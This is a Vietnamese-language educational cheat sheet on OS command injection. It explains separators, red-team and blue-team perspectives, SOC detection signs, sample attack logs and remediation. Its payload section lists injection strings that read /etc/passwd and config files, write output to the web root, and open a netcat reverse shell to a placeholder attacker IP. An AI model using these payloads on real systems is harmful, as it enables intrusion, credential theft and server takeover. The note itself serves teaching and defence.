# Command Injection (RCE)

## 1. Concept

**Command Injection** xảy ra khi một ứng dụng web chuyển dữ liệu do người dùng nhập (như tên file, địa chỉ IP) trực tiếp vào một câu lệnh hệ điều hành (Shell command) mà không được kiểm duyệt.

* **ELI5:** Hãy tưởng tượng website là một chiếc điều khiển từ xa. Thay vì chỉ được bấm nút "Chuyển kênh" (Ping IP), hacker đã tìm cách tháo chiếc điều khiển ra và đấu dây để có thể ra lệnh cho toàn bộ ngôi nhà (Server) như "Mở cửa" (Đọc file mật khẩu) hoặc "Tự hủy" (Xóa dữ liệu).
* **Hậu quả:** Kẻ tấn công đạt được **RCE (Remote Code Execution)**, cho phép thực thi bất kỳ lệnh nào trên máy chủ dưới quyền hạn của ứng dụng web.

## 2. Key Mechanism

Lỗ hổng này phát sinh từ việc sử dụng các hàm hệ thống (System Calls) không an toàn kết hợp với việc ghép chuỗi (Concatenation) dữ liệu người dùng.

1. **Dòng chảy dữ liệu:** `User Input` -> `Vulnerable Web Function (exec, system)` -> `OS Shell (Bash/CMD)`.
2. **Kỹ thuật ngắt lệnh (Command Separators):** Hệ điều hành hỗ trợ các ký tự đặc biệt để chạy nhiều lệnh cùng lúc. Hacker sử dụng chúng để kết thúc lệnh gốc và bắt đầu lệnh độc hại.
   * **Linux:** `;`, `&&`, `||`, `|`, `` ` ``, `$()`.
   * **Windows:** `&`, `&&`, `||`, `|`.
3. **Phân loại:**
   * **Verbose (In-band):** Kết quả của câu lệnh hiện ngay lập tức trên giao diện web.
   * **Blind:** Server không in kết quả ra màn hình. Hacker phải dùng kỹ thuật **Time-based** (`sleep`) hoặc **Redirection** (`> out.txt`) để xác nhận.

## 3. Security Perspective

### 🔴 Attacker View (Red Team)

Hacker thực hiện theo các bước từ thăm dò đến chiếm quyền:

* **Detection:** Thử chèn các ký tự ; sleep 10 vào các ô nhập liệu. Nếu web phản hồi chậm 10 giây -> Xác nhận lỗi Blind.
* **Evasion (Lách bộ lọc):** Nếu dấu / bị chặn, dùng mã hóa Hex (\x2f) hoặc dùng biến môi trường để tạo lại đường dẫn.
* **Exfiltration:** Dùng toán tử > để ghi kết quả lệnh vào thư mục web công khai (/var/www/html/exploit.txt) rồi dùng trình duyệt tải về.
* **Final Goal:** Tạo một **Reverse Shell** bằng Netcat (nc) để có một cửa sổ dòng lệnh điều khiển server từ xa.

### 🔵 Defender View (Blue Team/SOC)

Đây là lỗi cực kỳ nguy hiểm và cần được giám sát ở nhiều tầng (Web log và EDR).

* **Dấu hiệu nhận biết (SOC Alert):**
  * **Web Log (Inbound):** Sự hiện diện của các toán tử ;, &, | cùng với các lệnh hệ thống nhạy cảm (whoami, id, cat, dir, ipconfig, net user).
  * **Process Monitoring (EDR):** Quan trọng nhất! Phát hiện tiến trình Web (như apache2, nginx, php-fpm, node) sinh ra các tiến trình con là Shell (/bin/sh, /bin/bash, cmd.exe, powershell.exe). **Người dùng bình thường không bao giờ làm điều này.**
  * **Network Outbound:** Máy chủ web bỗng dưng kết nối ra ngoài bằng các cổng lạ (Dấu hiệu của Reverse Shell).
* **Giả lập dòng Log điển hình (Nginx/Apache Log):**

```
# SOC thấy IP lạ đang cố chèn lệnh để đọc file /etc/passwd
192.168.10.5 - - [23/May/2024:14:00:01] "POST /dns-lookup HTTP/1.1" 200 450 "host=8.8.8.8; cat /etc/passwd"

# Dấu hiệu tấn công Blind bằng lệnh Sleep (Time-based)
192.168.10.5 - - [23/May/2024:14:05:10] "GET /ping?ip=127.0.0.1%26%26sleep%2010 HTTP/1.1" 200 120
```

## 4. Useful Commands

### 🛠️ Ký tự phân tách lệnh (Command Separators)

<table data-header-hidden><thead><tr><th width="156.79998779296875"></th><th width="140.199951171875"></th><th width="311.79693603515625"></th></tr></thead><tbody><tr><td>Hệ điều hành</td><td>Ký tự</td><td>Ý nghĩa</td></tr><tr><td><strong>Linux/Windows</strong></td><td>&#x26;&#x26;</td><td>Chạy lệnh 2 nếu lệnh 1 thành công</td></tr><tr><td><strong>Linux/Windows</strong></td><td>||</td><td>Chạy lệnh 2 nếu lệnh 1 thất bại</td></tr><tr><td><strong>Linux/Windows</strong></td><td>|</td><td>Lấy đầu ra lệnh 1 làm đầu vào lệnh 2</td></tr><tr><td><strong>Linux Only</strong></td><td>;</td><td>Chạy tuần tự (Lệnh 1 xong đến lệnh 2)</td></tr><tr><td><strong>Linux Only</strong></td><td>`lệnh` hoặc $()</td><td>Thực thi lệnh bên trong một lệnh khác</td></tr></tbody></table>

### 🔓 Payloads khai thác phổ biến

```bash
# 1. Trình xác nhận (Detection)
; whoami
; sleep 5
; ping -c 5 127.0.0.1

# 2. Đọc file nhạy cảm (Linux)
; cat /etc/passwd
; cat /var/www/html/config.php

# 3. Ghi file ra thư mục web (Exfiltration)
; id > /var/www/html/result.txt

# 4. Reverse Shell (Kết nối về máy Hacker)
; nc -e /bin/sh <hacker_ip> <port>
```

### 🔒 Remediation (Giải pháp phòng thủ)

1. **Tránh sử dụng hàm hệ thống:** Thay vì dùng system("ls"), hãy dùng các thư viện có sẵn của ngôn ngữ (ví dụ: os.listdir() trong Python).
2. **Input Validation (Whitelist):** Chỉ cho phép các ký tự an toàn (A-Z, 0-9). Cấm tuyệt đối các ký tự điều khiển ; & | > <.
3. **Escape Shell Arguments:** Sử dụng các hàm như escapeshellarg() (PHP) để vô hiệu hóa các ký tự đặc biệt.
4. **Principle of Least Privilege:** Chạy web server với quyền hạn cực thấp (vd: user www-data) và cấm tài khoản này thực thi các lệnh quản trị cao cấp.

